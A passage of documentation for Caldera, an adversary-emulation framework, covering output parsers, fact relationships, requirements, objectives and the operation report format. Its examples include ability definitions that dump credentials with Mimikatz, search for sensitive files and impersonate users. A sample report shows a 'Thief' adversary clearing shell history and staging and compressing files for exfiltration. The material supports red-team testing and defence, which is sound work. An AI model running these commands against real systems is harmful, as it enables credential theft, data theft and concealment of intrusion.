have any specified parsers associated with the command, Caldera will use its default parsers
to parse the output.

Non-default Parser python modules are typically stored in individual plugins, such as `stockpile`, in the
plugin's `app/parsers/` directory. For instance, if you look in `plugins/stockpile/app/parsers`, 
you can see a variety of parsers that are provided out-of-the-box.

Default parsers are located in the core Caldera repo, under `app/learning`. 
Two example modules are `p_ip.py` and `p_path.py`, which are used to parse IP addresses and file
paths, respectively. Note that the default parsers have a different location due to their
association with the learning service.
 

## Linking Parsers to an Ability
To associate specific parsers to an ability command, use the `parsers` keyword in the yaml file
within the executor section (see the below example).

```yaml
    darwin:
      sh:
        command: |
          find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.file.path
              edge: has_extension
              target: file.sensitive.extension
```

Note that the parsers value is a nested dictionary whose key is the Python module import path 
of the parser to reference; in this case, `plugins.stockpile.app.parsers.basic` for the Parser 
located in `plugins/stockpile/app/parsers/basic.py`. 
The value of this inner dict is a list of fact mappings that tell the Parser what facts and 
relationships to save based on the output. In this case, we only have one mapping in the list.

Each mapping consists of the following:
- **Source** (required): A fact to create for any matches from the parser

- **Edge** (optional): A relationship between the source and target. This should be a string.

- **Target** (optional): A fact to create which the source connects to.

In the above example, the `basic` parser will take each line of output from the `find` command,
save it as a `host.file.path` fact, and link it to the `file.sensitive.extension` fact used in 
the command with the `has_extension` edge. For instance, if the command was run using a 
`file.sensitive.extension` value of `docx` and the `find` command returned `/path/to/mydoc.docx`
and `/path/to/sensitive.docx`, the parser would generate the following facts and relationships:
- `/path/to/mydoc.docx` <- `has_extension` -> `docx`
- `/path/to/sensitive.docx` <- `has_extension` -> `docx`

Note that only one parser can be linked to a command at a time, though a single parser can be used to
generate multiple facts, as in our hypothetical example above. Also note that the parser only works
for the associated command executor, so you can use different parsers for different executors and
even different platforms. 

The example below shows a more complicated parser - the `katz` parser in the `stockpile` plugin.
This example has multiple fact mappings for a single parser, since we want to extract different
types of information from the Mimikatz output - in particular, the password and password hash 
information.

```yaml
  platforms:
    windows:
      psh:
        command: |
          Import-Module .\invoke-mimi.ps1;
          Invoke-Mimikatz -DumpCreds
        parsers:
          plugins.stockpile.app.parsers.katz:
          - source: domain.user.name
            edge: has_password
            target: domain.user.password
          - source: domain.user.name
            edge: has_hash
            target: domain.user.ntlm
          - source: domain.user.name
            edge: has_hash
            target: domain.user.sha1
        payloads:
        - invoke-mimi.ps1
```

This time, we are using `plugins.stockpile.app.parsers.katz`, which will take the output
from the `Invoke-Mimikatz -DumpCreds` command and apply the 3 specified mappings when parsing
the output. Note that in all 3 mappings, the source fact is the same: `domain.user.name`, but
the relationship edges and target facts are all different, based on what kind of information we
want to save. The resulting facts, assuming the command was successful and provided the desired
information, will include the username, password, NTLM hash, and SHA1 hash, all linked together
with the appropriate relationship edges.

# Relationships

Many Caldera abilities require input variables called "facts" to be provided before the ability can be run. These facts can be provided through fact sources, or they can be discovered by a previous ability.

## Creating Relationships using Abilities

### Example

As an example, the following printer discovery ability will create two facts called `host.print.file` and `host.print.size`:

```yaml
- id: 6c91884e-11ec-422f-a6ed-e76774b0daac
  name: View printer queue
  description: View details of queued documents in printer queue
  tactic: discovery
  technique:
    attack_id: T1120
    name: Peripheral Device Discovery
  platforms:
    darwin:
      sh:
        command: lpq -a
        parsers:
          plugins.stockpile.app.parsers.printer_queue:
          - source: host.print.file
            edge: has_size
            target: host.print.size
```

This ability will view the printer queue using the command `lpq -a`. The result of `lpq -a` will be parsed into two facts: `host.print.file` (the `source`) and `host.print.size` (the `target`). These two facts are dependent on each other, and it will be helpful to understand their connection in order to use them. Therefore, we use the `edge` variable to explain the relationship between the `source` and the `target`. In this case, the `edge` is `has_size`, because `host.print.size` is the file size of `host.print.file`. All together, the `source`, `edge`, and `target` comprise a "relationship". To learn more about how the parser file creates a relationship, refer to [Parsers](Parsers.md).

### Multiple Instances of a Fact
Storing the relationship between the `source` and the `target` in the `edge` allows Caldera to save several instances of each fact while maintaining the connection between facts. For example, if the printer discovery ability (shown above) is run, and several files are discovered in the printer queue, the following facts may be created. 

| host.print.file | host.print.size (bytes) |
| --------------- | ----------------------- |
| essay.docx      | 12288                   |
| image-1.png     | 635000                  |
| Flier.pdf       | 85300                   |

The table above shows how each `host.print.file` value is associated with exactly one `host.print.size` value. This demonstrates the importance of the `edge`; it maintains the association between each pair of `source` and `target` values. Without the `edge`, we would just have a list of values but no information about their relationships, similar to the following:

- `host.print.file`: `essay.docx`, `image-1.png`, `Flier.pdf`
- `host.print.size`: `12288`, `635000`, `85300`


### Optional Components

Note that the `edge` and the `target` are optional. You can create a `source` as an independent fact without needing to connect it to a `target`. 


## Creating Relationships using Caldera Server
Relationships can also be created in the Caldera Server GUI. Use the left sidebar to navigate to "fact sources." Then, click "relationships" followed by "new relationship." You can fill in  values for the `edge`, `source`, and `target` to be used in future operations. Then click "Save" to finish!

![fact relationships](img/fact_relationships.png)


# Requirements

Requirements are a mechanism used by Caldera to determine whether an ability should be run in the course of an
operation. By default, Caldera supplies several requirements [within the Stockpile plugin](https://github.com/mitre/stockpile/tree/master/app/requirements)
that can be used by an ability to ensure the ability only runs when the facts being used by the ability command meet
certain criteria.

Requirements are defined in a Python module and are then referenced inside an ability. All requirements must be provided
at least a `source` fact to enforce the defined requirement on. Depending on the requirement module, a requirement
module may also need an `edge` value and a `target` fact to be provided as arguments to enforce the defined requirement.

See [Relationships](Relationships.md) for more information on relationship `source`, `edge`, and `target` values.


## Example

Let's look at the **Impersonate User** ability from Stockpile as an example.

```yaml
- id: 3796a00b-b11d-4731-b4ca-275a07d83299
  name: Impersonate user
  description: Run an application as a different user
  tactic: execution
  technique:
    attack_id: T1059.001
    name: "Command and Scripting Interpreter: PowerShell"
  platforms:
    windows:
      psh:
        command: |
          $job = Start-Job -ScriptBlock {
            $username = '#{host.user.name}';
            $password = '#{host.user.password}';
            $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
            $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
            Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;
          };
          Receive-Job -Job $job -Wait;
  requirements:
    - plugins.stockpile.app.requirements.paw_provenance:
      - source: host.user.name
    - plugins.stockpile.app.requirements.basic:
      - source: host.user.name
        edge: has_password
        target: host.user.password
```

Notice in the ability command, two facts `host.user.name` and `host.user.password` will be used. The `paw_provenance`
requirement enforces that only `host.user.name` facts that were discovered by the agent running the ability can be used
(i.e. fact originated from the same `paw`). In the scenario this ability is run against two agents on two different
hosts where multiple `host.user.name` and `host.user.password` facts were discovered, the `paw_provenance` prevents
facts discovered by the first agent on the first host from being used by the second agent on the second host. This
ensures facts discovered locally on one host are only used on the host where those facts would apply, such as in the
scenario the `host.user.name` is a local account that only exists on the host it was discovered on. Other possible
usages could apply the `paw_provenance` requirement to files discovered, file paths, and running processes, all of
which would be discovered information that should only be used by the host they were discovered on and not globally by
other agents running on other hosts in an operation.

Additionally, the `basic` requirement enforces that only `host.user.name` facts with an existing `has_password`
relationship to an existing `host.user.password` fact may be used. Brute forcing all available combinations of
`host.user.name` facts and `host.user.password` facts could result in high numbers of failed login attempts or locking
out an account entirely. The `basic` requirement ensures that the user and password combination used has a high chance
of success since the combination's relationship has already been established by a previous ability.

The combined effect these requirements have ensures that the Caldera operation will only attempt reliable combinations
of `host.user.name` and `host.user.password` facts specific to the agent running the ability, instead of arbitrarily
attempting all possible combinations of `host.user.name` and `host.user.password` facts available to the agent.


# Objectives

As part of ongoing efforts to increase the capabilities of Caldera's Planners, the team has implemented 
Objectives. Objectives are collections of fact targets, called Goals, which can be tied to Adversaries. 
When an Operation starts, the Operation will store a copy of the Objective linked to the chosen Adversary, 
defaulting to a base Goal of "running until no more steps can be run" if no Objective can be found. During 
the course of an Operation, every time the planner moves between buckets, the current Objective status is 
evaluated in light of the current knowledge of the Operation, with the Operation completing should all 
goals be met.

### Objectives

The Objective object can be examined at `app/objects/c_objective.py`. 

Objective objects utilize four attributes, documented below:

* **id**: The id of the Objective, used for referencing it in Adversaries
* **name**: The name of the Objective
* **description**: A description for the Objective
* **goals**: A list of individual Goal objects

> For an Objective to be considered complete, all Goals associated with it must be achieved during an 
Operation

At the moment, Objectives can be added to Caldera by creating Objective YAML files, such as the one 
shown below, or through Objectives web UI modal:

```yaml
id: 7ac9ef07-defa-4d09-87c0-2719868efbb5
name: testing
description: This is a test objective that is satisfied if it finds a user with a username of 'test'
goals:
  - count: 1
    operator: '='
    target: host.user.name
    value: 'test'
``` 

Objectives can be tied to Adversaries either through the Adversaries web UI, or by adding a line similar 
to the following to the Adversary's YAML file:

```yaml
objective: 7ac9ef07-defa-4d09-87c0-2719868efbb5
```

### Goals

Goal objects can be examined at `app/objects/secondclass/c_goal.py`. Goal objects are handled as 
extensions of Objectives, and are not intended to be interacted with directly.

Goal objects utilize four attributes, documented below:

* **target**: The fact associated with this goal, i.e. `host.user.name`
* **value**: The value this fact should have, i.e. `test`
* **count**: The number of times this goal should be met in the fact database to be satisfied, defaults 
to infinity (2^20)
* **operator**: The relationship to validate between the target and value. Valid operators include:
    * **`<`**: Less Than
    * **`>`**: Greater Than
    * **`<=`**: Less Than or Equal to
    * **`>=`**: Greater Than or Equal to
    * **`in`**: X in Y
    * **`*`**: Wildcard - Matches on existence of `target`, regardless of `value`
    * **`==`**: Equal to        

Goals can be input to Caldera either through the Objectives web UI modal, or through Objective YAML files,
 where they can be added as list entries under goals. In the example of this below, the Objective 
 references two Goals, one that targets the specific username of `test`, and the other that is satisfied 
 by any two acquired usernames:

```yaml
goals:
  - count: 1
    operator: '='
    target: host.user.name
    value: 'test'
  - count: 2
    operator: '*'
    target: host.user.name
    value: 'N/A'
``` 

# Operation Results

The "Operations" tab enables users to view past operations, create new operations, and export operation reports in `JSON` or `csv` format.  When starting a new operation, the "Operations" tab UI provides information on which commands are executed, their status as recorded by the Caldera C2 server, and the captured `stdout` and `stderr` as applicable.

After completing an operation, you can explore the operations setup, progress, and execution graph using the "Debrief" plugin. Debrief also provides executive-level overviews of the operations progress and the attacks success as a `PDF` report.

After an operation runs, you can export the results in two different `JSON` formats: an operation report or operation event logs.  Both are rich sources of information on the technical specifics of which commands were executed, at what time, and with what result.  The event logs report ability-level execution records, while the operation report covers a broader range of target, contact, and planning information.  The structures of each are compared in the [Operation Report](#operation-report) and [Event Logs](#operation-event-logs) sections.

## Operation Report

The operation report JSON consists of a single dictionary with the following keys and values:
- `name`: String representing the name of the operation
- `host_group`: JSON list of dictionary objects containing information about an agent in the operation. 
- `start`: String representing the operation start time in YYYY-MM-DD HH:MM:SS format.
- `steps`: nested JSON dict that maps agent paw strings to an inner dict which maps the string key `steps` to a list of dict objects. Each innermost dict contains information about a step that the agent took during the operation:
    - `link_id`: String representing the UUID of the executed link.
    - `ability_id`: String representing the UUID of the corresponding ability for the command. (e.g. `90c2efaa-8205-480d-8bb6-61d90dbaf81b`)
    - `command`: String containing the base64 encoding of the command that was run.
    - `delegated`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation made the link available for collection
    - `run`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the agent submitted the execution results for the command.
    - `status`: Int representing the status code for the command.
    - `platform`: String representing the operating system on which the command was run.
    - `executor`: String representing which agent executor was used for the command (e.g. `psh` for PowerShell).
    - `pid`: Int representing the process ID for running the command.
    - `description`: String representing the command description, taken from the corresponding ability description.
    - `name`: String representing the command nae, taken from the corresponding ability name.
    - `attack`: JSON dict containing ATT&CK-related information for the command, based on the ATT&CK information provided by the corresponding ability:
        - `tactic`: ATT&CK tactic for the command ability.
        - `technique_name`: Full ATT&CK technique name for the command.
        - `technique_id`: ATT&CK technique ID for the command (e.g. `T1005`)
    - `output`: optional field. JSON dict containing the output generated when running the command. Only appears if the user selected the `include agent output` option when downloading the report.
        - `stdout`: Standard output from the command that was run.
        - `stderr`: Standard error from the command that was run.
        - `exit_code`: Exit code returned from the command that was run.
- `finish`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation finished.
- `planner`: Name of the planner used for the operation.
- `adversary`: JSON dict containing information about the adversary used in the operation
    - `atomic_ordering`: List of strings that contain the ability IDs for the adversary.
    - `objective`: objective UUID string for the adversary.
    - `tags`: List of adversary tags
    - `has_repeatable_abilities`: A boolean flag indicating if any ability in the adversary is repeatable.
    - `name`: Adversary name
    - `description`: Adversary description
    - `plugin`: The adversary's source plugin (e.g. `stockpile`)
    - `adversary_id`: Adversary UUID string
- `jitter`: String containing the min/max jitter values.
- `objectives`: JSON dict containing information about the operation objective.
- `facts`: list of dict objects, where each dict represents a fact used or collected in the operation.
    - `origin_type`: String representation of the fact's origin (e.g. `SEEDED` if seeded by the operation's fact source or `LEARNED` if the fact was learned during execution of the operation)
    - `created`: String representing the fact creation time in YYYY-MM-DD HH:MM:SS format
    - `name`: String representation of the fact's name in major to minor format (e.g. `file.sensitive.extension` for a sensitive file extension) 
    - `source`: A string representing the UUID of the fact source containing this fact
    - `score`: Integer representing the fact score
    - `value`: A string representing the fact's value (e.g. a fact named `file.sensitive.extension` may have a value `yml`)
    - `links`: A list of string-valued link UUID which generated this fact
    - `limit_count`: Integer representing the maximum number of occurrences this fact can have in the fact source, defaults to `-1`
    - `technique_id`: ATT&CK technique ID for the command (e.g. `T1005`)
    - `relationships`: list of string-valued fact relationships for facts with this name and value (e.g. `host.file.path(/Users/foo/bar.yml) : has_extension : file.sensitive.extension(yml))`)
    - `trait`: A string representing the fact's trait, or the information the fact seeks to store and capture (e.g. `file.sensitive.extension`)
    - `collected_by`: A list of string-valued agent UUIDs which collected this fact.
    - `unique`: A string representing the fact's unique value (e.g. `file.sensitive.extensionyml`)
- `skipped_abilities`: list of JSON dicts that map an agent paw to a list of inner dicts, each representing a skipped ability.
    - `reason`: Indicates why the ability was skipped (e.g. `Wrong Platform`)
    - `reason_id`: ID number for the reason why the ability was skipped.
    - `ability_id`: UUID string for the skipped ability
    - `ability_name`: Name of the skipped ability.

To download an operation report manually, users can click the "Download Report" button under the operation drop-down list in the operation modal. To include the command output, select the `include agent output` checkbox.

Below is an example operation report JSON:

### Sample Operation Report

```json
{
  "adversary": {
    "adversary_id": "1a98b8e6-18ce-4617-8cc5-e65a1a9d490e",
    "atomic_ordering": [
      "6469befa-748a-4b9c-a96d-f191fde47d89",
      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "4e97e699-93d7-4040-b5a3-2e906a58199e",
      "300157e5-f4ad-4569-b533-9d1fa0e74d74",
      "ea713bc4-63f0-491c-9a6f-0b01d560b87e"
    ],
    "description": "An adversary to steal sensitive files",
    "has_repeatable_abilities": false,
    "name": "Thief",
    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
    "plugin": "stockpile",
    "tags": []
  },
  "facts": [
    {
      "collected_by": [],
      "created": "2022-05-11T22:07:07Z",
      "limit_count": -1,
      "links": [
        "fa7ac865-004d-4296-9d68-fd425a481b5e"
      ],
      "name": "file.sensitive.extension",
      "origin_type": "SEEDED",
      "relationships": [
        "host.file.path(/Users/foo/bar/sensitive.sql) : has_extension : file.sensitive.extension(sql)"
      ],
      "score": 6,
      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
      "technique_id": "",
      "trait": "file.sensitive.extension",
      "unique": "file.sensitive.extensionsql",
      "value": "sql"
    },
    {
      "collected_by": [],
      "created": "2022-05-11T22:07:07Z",
      "limit_count": -1,
      "links": [
        "ddf2aa96-24a1-4e71-8360-637a821b0781"
      ],
      "name": "file.sensitive.extension",
      "origin_type": "SEEDED",
      "relationships": [
        "host.file.path(/Users/foo/bar/credentials.yml) : has_extension : file.sensitive.extension(yml)"
      ],
      "score": 6,
      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
      "technique_id": "",
      "trait": "file.sensitive.extension",
      "unique": "file.sensitive.extensionyml",
      "value": "yml"
    },
    {
      "collected_by": [],
      "created": "2022-05-11T22:07:07Z",
      "limit_count": -1,
      "links": [
        "719378af-2f64-4902-9b51-fb506166032f"
      ],
      "name": "file.sensitive.extension",
      "origin_type": "SEEDED",
      "relationships": [
        "host.file.path(/Users/foo/bar/PyTorch Models/myModel.pt) : has_extension : file.sensitive.extension(pt)"
      ],
      "score": 6,
      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
      "technique_id": "",
      "trait": "file.sensitive.extension",
      "unique": "file.sensitive.extensionpt",
      "value": "pt"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:07:20Z",
      "limit_count": -1,
      "links": [
        "d52a51ff-b7af-44a1-a2f8-2f2fa68b5c73"
      ],
      "name": "host.dir.staged",
      "origin_type": "LEARNED",
      "relationships": [
        "host.dir.staged(/Users/foo/staged)"
      ],
      "score": 2,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1074.001",
      "trait": "host.dir.staged",
      "unique": "host.dir.staged/Users/foo/staged",
      "value": "/Users/foo/staged"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:08:56Z",
      "limit_count": -1,
      "links": [
        "719378af-2f64-4902-9b51-fb506166032f"
      ],
      "name": "host.file.path",
      "origin_type": "LEARNED",
      "relationships": [
        "host.file.path(/Users/foo/bar/PyTorch Models/myModel.pt) : has_extension : file.sensitive.extension(pt)"
      ],
      "score": 1,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1005",
      "trait": "host.file.path",
      "unique": "host.file.path/Users/foo/bar/PyTorch Models/myModel.pt",
      "value": "/Users/foo/bar/PyTorch Models/myModel.pt"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:09:07Z",
      "limit_count": -1,
      "links": [
        "ddf2aa96-24a1-4e71-8360-637a821b0781"
      ],
      "name": "host.file.path",
      "origin_type": "LEARNED",
      "relationships": [
        "host.file.path(/Users/foo/bar/credentials.yml) : has_extension : file.sensitive.extension(yml)"
      ],
      "score": 1,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1005",
      "trait": "host.file.path",
      "unique": "host.file.path/Users/foo/bar/credentials.yml",
      "value": "/Users/foo/bar/credentials.yml"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:10:45Z",
      "limit_count": -1,
      "links": [
        "fa7ac865-004d-4296-9d68-fd425a481b5e"
      ],
      "name": "host.file.path",
      "origin_type": "LEARNED",
      "relationships": [
        "host.file.path(/Users/foo/bar/sensitive.sql) : has_extension : file.sensitive.extension(sql)"
      ],
      "score": 1,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1005",
      "trait": "host.file.path",
      "unique": "host.file.path/Users/foo/bar/sensitive.sql",
      "value": "/Users/foo/bar/sensitive.sql"
    }
  ],
  "finish": "2022-05-11T22:15:04Z",
  "host_group": [
    {
      "architecture": "amd64",
      "available_contacts": [
        "HTTP"
      ],
      "contact": "HTTP",
      "created": "2022-05-11T18:42:02Z",
      "deadman_enabled": true,
      "display_name": "TARGET-PC$foo",
      "exe_name": "splunkd",
      "executors": [
        "proc",
        "sh"
      ],
      "group": "red",
      "host": "TARGET-PC",
      "host_ip_addrs": [
        "192.168.1.3",
        "100.64.0.1"
      ],
      "last_seen": "2022-05-11T22:39:17Z",
      "links": [
        {
          "ability": {
            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
            "access": {},
            "additional_info": {},
            "buckets": [
              "defense-evasion"
            ],
            "delete_payload": true,
            "description": "Stop terminal from logging history",
            "executors": [
              {
                "additional_info": {},
                "build_target": null,
                "cleanup": [],
                "code": null,
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "language": null,
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "platform": "darwin",
                "timeout": 60,
                "uploads": [],
                "variations": []
              },
              {
                "additional_info": {},
                "build_target": null,
                "cleanup": [],
                "code": null,
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "language": null,
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "platform": "linux",
                "timeout": 60,
                "uploads": [],
                "variations": []
              },
              {
                "additional_info": {},
                "build_target": null,
                "cleanup": [],
                "code": null,
                "command": "Clear-History;Clear",
                "language": null,
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "platform": "windows",
                "timeout": 60,
                "uploads": [],
                "variations": []
              }
            ],
            "name": "Avoid logs",
            "plugin": "stockpile",
            "privilege": null,
            "repeatable": false,
            "requirements": [],
            "singleton": false,
            "tactic": "defense-evasion",
            "technique_id": "T1070.003",
            "technique_name": "Indicator Removal on Host: Clear Command History"
          },
          "agent_reported_time": "2022-05-11T18:42:02Z",
          "cleanup": 0,
          "collect": "2022-05-11T18:42:02Z",
          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
          "deadman": false,
          "decide": "2022-05-11T18:42:02Z",
          "executor": {
            "additional_info": {},
            "build_target": null,
            "cleanup": [],
            "code": null,
            "command": "> $HOME/.bash_history && unset HISTFILE",
            "language": null,
            "name": "sh",
            "parsers": [],
            "payloads": [],
            "platform": "darwin",
            "timeout": 60,
            "uploads": [],
            "variations": []
          },
          "facts": [],
          "finish": "2022-05-11T18:42:02Z",
          "host": "TARGET-PC",
          "id": "be6db169-f88d-46f5-8375-ace0e0b2a0df",
          "jitter": 0,
          "output": {
            "stdout": "False",
            "stderr": "",
            "exit_code": "0"
          },
          "paw": "vrgirx",
          "pid": "14441",
          "pin": 0,
          "relationships": [],
          "score": 0,
          "status": 0,
          "unique": "be6db169-f88d-46f5-8375-ace0e0b2a0df",
          "used": [],
          "visibility": {
            "adjustments": [],
            "score": 50
          }
        }
      ],
      "location": "/Users/foo/splunkd",
      "origin_link_id": "",
      "paw": "vrgirx",
      "pending_contact": "HTTP",
      "pid": 32746,
      "platform": "darwin",
      "ppid": 32662,
      "privilege": "User",
      "proxy_chain": [],
      "proxy_receivers": {},
      "server": "http://0.0.0.0:8888",
      "sleep_max": 60,
      "sleep_min": 30,
      "trusted": true,
      "upstream_dest": "http://0.0.0.0:8888",
      "username": "foo",
      "watchdog": 0
    }
  ],
  "jitter": "2/8",
  "name": "mock_operation_report",
  "objectives": {
    "description": "This is a default objective that runs forever.",
    "goals": [
      {
        "achieved": false,
        "count": 1048576,
        "operator": "==",
        "target": "exhaustion",
        "value": "complete"
      }
    ],
    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
    "name": "default",
    "percentage": 0
  },
  "planner": "atomic",
  "skipped_abilities": [
    {
      "vrgirx": []
    }
  ],
  "start": "2022-05-11T22:07:07Z",
  "steps": {
    "vrgirx": {
      "steps": [
        {
          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
          "agent_reported_time": "2022-05-11T22:07:20Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=",
          "delegated": "2022-05-11T22:07:07Z",
          "description": "create a directory for exfil staging",
          "executor": "sh",
          "link_id": "d52a51ff-b7af-44a1-a2f8-2f2fa68b5c73",
          "name": "Create staging directory",
          "output": {
            "stdout": "/Users/foo/staged",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56272,
          "platform": "darwin",
          "run": "2022-05-11T22:07:20Z",
          "status": 0
        },
        {
          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
          "agent_reported_time": "2022-05-11T22:08:02Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1005",
            "technique_name": "Data from Local System"
          },
          "command": "ZmluZCAvVXNlcnMgLW5hbWUgJyoucHQnIC10eXBlIGYgLW5vdCAtcGF0aCAnKi9cLionIC1zaXplIC01MDBrIDI+L2Rldi9udWxsIHwgaGVhZCAtNQ==",
          "delegated": "2022-05-11T22:07:22Z",
          "description": "Locate files deemed sensitive",
          "executor": "sh",
          "link_id": "719378af-2f64-4902-9b51-fb506166032f",
          "name": "Find files",
          "output": {
            "stdout": "/Users/foo/bar/PyTorch\\ Models/myModel.pt",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56376,
          "platform": "darwin",
          "run": "2022-05-11T22:08:56Z",
          "status": 0
        },
        {
          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
          "agent_reported_time": "2022-05-11T22:09:02Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1005",
            "technique_name": "Data from Local System"
          },
          "command": "ZmluZCAvVXNlcnMgLW5hbWUgJyoueW1sJyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=",
          "delegated": "2022-05-11T22:08:57Z",
          "description": "Locate files deemed sensitive",
          "executor": "sh",
          "link_id": "ddf2aa96-24a1-4e71-8360-637a821b0781",
          "name": "Find files",
          "output": {
            "stdout": "/Users/foo/bar/credentials.yml",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56562,
          "platform": "darwin",
          "run": "2022-05-11T22:09:07Z",
          "status": 0
        },
        {
          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
          "agent_reported_time": "2022-05-11T22:09:53Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1005",
            "technique_name": "Data from Local System"
          },
          "command": "ZmluZCAvVXNlcnMgLW5hbWUgJyouc3FsJyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=",
          "delegated": "2022-05-11T22:09:12Z",
          "description": "Locate files deemed sensitive",
          "executor": "sh",
          "link_id": "fa7ac865-004d-4296-9d68-fd425a481b5e",
          "name": "Find files",
          "output": {
            "stdout": "/Users/foo/bar/sensitive.sql",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56809,
          "platform": "darwin",
          "run": "2022-05-11T22:10:45Z",
          "status": 0
        },
        {
          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
          "agent_reported_time": "2022-05-11T22:10:55Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "Y3AgIi9Vc2Vycy9jamVsbGVuL0RvY3VtZW50cy9kZW1vL1B5VG9yY2hcIE1vZGVscy9teU1vZGVsLW5pZ2h0bHkucHQiIC9Vc2Vycy9jamVsbGVuL3N0YWdlZA==",
          "delegated": "2022-05-11T22:10:47Z",
          "description": "copy files to staging directory",
          "executor": "sh",
          "link_id": "4a55c2c9-eb9d-4e31-b2b6-8bb4b4ab2950",
          "name": "Stage sensitive files",
          "output": {
            "stdout": "",
            "stderr": "cp: /Users/foo/bar/PyTorch\\ Models/myModel.pt: No such file or directory",
            "exit_code": "1"
          },
          "pid": 57005,
          "platform": "darwin",
          "run": "2022-05-11T22:10:55Z",
          "status": 1
        },
        {
          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
          "agent_reported_time": "2022-05-11T22:11:34Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "Y3AgIi9Vc2Vycy9jamVsbGVuL29wdC9hbmFjb25kYTMvZW52cy9mYWlyL2xpYi9weXRob24zLjgvc2l0ZS1wYWNrYWdlcy9zYWNyZW1vc2VzL2RhdGEvbm9uYnJlYWtpbmdfcHJlZml4ZXMvbm9uYnJlYWtpbmdfcHJlZml4LnB0IiAvVXNlcnMvY2plbGxlbi9zdGFnZWQ=",
          "delegated": "2022-05-11T22:10:57Z",
          "description": "copy files to staging directory",
          "executor": "sh",
          "link_id": "a5ef6774-6eed-4383-a769-420092e1ba27",
          "name": "Stage sensitive files",
          "pid": 57105,
          "platform": "darwin",
          "run": "2022-05-11T22:11:34Z",
          "status": 0
        },
        {
          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
          "agent_reported_time": "2022-05-11T22:12:22Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "Y3AgIi9Vc2Vycy9jamVsbGVuL29wdC9hbmFjb25kYTMvbGliL3B5dGhvbjMuOC9zaXRlLXBhY2thZ2VzL3NhY3JlbW9zZXMvZGF0YS9ub25icmVha2luZ19wcmVmaXhlcy9ub25icmVha2luZ19wcmVmaXgucHQiIC9Vc2Vycy9jamVsbGVuL3N0YWdlZA==",
          "delegated": "2022-05-11T22:11:37Z",
          "description": "copy files to staging directory",
          "executor": "sh",
          "link_id": "b2ba877c-2501-4abc-89a0-aeada909f52b",
          "name": "Stage sensitive files",
          "pid": 57294,
          "platform": "darwin",
          "run": "2022-05-11T22:12:22Z",
          "status": 0
        },
        {
          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
          "agent_reported_time": "2022-05-11T22:13:02Z",
          "attack": {
            "tactic": "exfiltration",
            "technique_id": "T1560.001",
            "technique_name": "Archive Collected Data: Archive via Utility"
          },
          "command": "dGFyIC1QIC16Y2YgL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neiAvVXNlcnMvY2plbGxlbi9zdGFnZWQgJiYgZWNobyAvVXNlcnMvY2plbGxlbi9zdGFnZWQudGFyLmd6",
          "delegated": "2022-05-11T22:12:27Z",
          "description": "Compress a directory on the file system",
          "executor": "sh",
          "link_id": "795b4b12-1355-49ea-96e8-f6d3d045334d",
          "name": "Compress staged directory",
          "output": {
            "stdout": "/Users/foo/staged.tar.gz",
            "stderr": "",
